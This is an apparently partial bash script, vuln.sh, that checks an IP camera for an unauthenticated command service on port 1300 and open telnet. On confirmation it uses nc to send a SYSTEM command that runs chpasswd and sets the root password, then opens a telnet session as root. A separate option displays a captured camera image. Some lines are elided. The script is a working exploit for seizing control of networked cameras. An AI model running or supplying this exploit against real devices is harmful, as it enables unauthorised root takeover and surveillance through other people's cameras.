#!/bin/bash
# Created by Brian Thanushikan with additions by Andy Hull
if [ "$1" != "check" ] && [ "$1" != "show" ] && [ "$1" != "notes" ]; then
	echo "USAGE [vuln.sh OPTION IP NEW_PASSWORD]"
	echo "To check for vulnerabilities    : vuln.sh check IP new_password";
	echo "If vulnerable, password will be changed to whatever you pass as new_password and you will be offerd the chance to telnet to the device";
	echo " ";
	echo "To see the image of the camera  : vuln.sh show";
	echo "This assumes you have alredy run vuln.sh to gnerate the image"
fi
# FOO="${VARIABLE:-default}"
new_password="${3:-root}"
image_viewer="/usr/bin/eom"
...
if [ "$1" = "check" ]; then
	...
	if [ "$rce_1300" = "y" ] && [ "$telnet_23_a" = "y" ]; then
		...
		if [ "$confirmation" = "y" ]; then
			...
			response=$(echo "<SYSTEM>echo \"root:$new_password\" | chpasswd</SYSTEM>" | nc $2 1300);
			echo "[+]Response: $response";
			if [ "$response" = "<SYSTEM_ACK>ok</SYSTEM_ACK>" ]; then
				echo "[+]Log in via this LOGIN:root PASSWD:$new_password";
				echo "[+]";
				echo "";
				echo "";
				telnet $2;
...
if [ "$1" = "show" ]; then
	echo "Launching $image_viewer"
	"$image_viewer" "pic.jpg";
fi
